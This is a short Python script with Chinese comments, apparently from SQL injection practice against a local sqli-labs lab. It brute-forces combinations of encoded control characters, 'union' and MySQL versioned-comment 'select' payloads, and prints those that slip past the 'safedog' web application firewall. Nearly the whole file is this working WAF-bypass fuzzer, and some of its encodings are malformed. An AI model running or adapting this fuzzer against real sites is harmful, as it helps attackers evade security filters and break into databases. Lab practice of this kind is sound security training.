import requests
#使用特殊符号+特殊数字+/*!*/测试
#特殊字符%0a ,%0b, %0c...

#res = requests.get(url,headers=headers)　　向网站发起请求，并获取响应对象
#参数
#url ：需要抓取的URL地址
#headers : 请求头
#timeout : 超时时间，超过时间会抛出异常
#响应对象(res)属性
#encoding ：响应字符编码 res.encoding = 'utf-8'
#text ：字符串 网站源码
#content ：字节流 字符串网站源码
#status_code ：HTTP响应码
#url ：实际数据的URL地址 
#注释：
#            Ctrl + K + C  ;
#取消注释：
#            Ctrl + K+ U ；

url = 'http://127.0.0.1/sqlilabs/Less-2/?id=1 '
ch = ('%0aunion','%0bunion','%0cunion','%0dunion','%0eunion','%0funion','%0gunion','%0hunion')
a = '/*!'
b = 'select*/'
c = '1,2,3'
filename = 'less2sql.txt'
for i in range(44500,44600):
    for chx in ch[0:7]:
        urls = url+chx+a+str(i)+b+c
        with open(filename,'a') as file:
            file.write(urls+'\n')
        res = requests.get(urls)
        #如果返回网页字符串中没有安全狗
        if (res.text .find('safedog')) == -1:
            print(urls)





